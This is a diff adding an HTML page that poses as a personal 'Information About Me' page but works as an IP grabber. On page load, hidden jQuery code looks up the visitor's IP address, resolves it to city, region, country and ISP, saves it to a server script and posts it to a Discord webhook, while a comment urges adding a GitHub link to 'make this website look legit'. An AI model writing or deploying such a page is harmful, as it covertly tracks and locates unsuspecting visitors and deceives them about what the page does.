@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Information About Me</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+  <h1>Information About Me</h1>
+  <p>
+    // replace with info about urself or something
+
+  <button onclick="redirectToGithub()">My GitHub</button>
+
+  <script>
+    function redirectToGithub() {
+      window.location.href = "// replace with ur github link to make this website look legit";
+    }
+  </script>
+
+  <script>
+    $(document).ready(function() {
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+        var ipAddress = data.ip;
+
+        $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(info) {
+          var ipInfo = "IP Address: " + info.ip + "\n";
+          ipInfo += "City: " + info.city + "\n";
+          ipInfo += "Region: " + info.region + "\n";
+          ipInfo += "Country: " + info.country_name + "\n";
+          ipInfo += "ISP: " + info.org + "\n";
+
+          $.ajax({
+            type: "POST",
+            url: "saveip.php",
+            data: { ip: ipAddress },
+            success: function(response) {
+              console.log("IP saved successfully.");
+            },
+            error: function(xhr, status, error) {
+              console.error("Error saving IP: " + error);
+            }
+          });
+
+          var discordWebhookUrl = "// replace with your discord webhook link";
+          $.ajax({
+            type: "POST",
+            url: discordWebhookUrl,
+            contentType: "application/json",
+            data: JSON.stringify({
+              content: "IP Information:\n" + ipInfo
+            }),
+            success: function(response) {
+              console.log("IP information sent to Discord successfully.");
+            },
+            error: function(xhr, status, error) {
+              console.error("Error sending IP information to Discord: " + error);
+            }
+          });
+        });
+      });
+    });
+  </script>
+</body>
+</html>
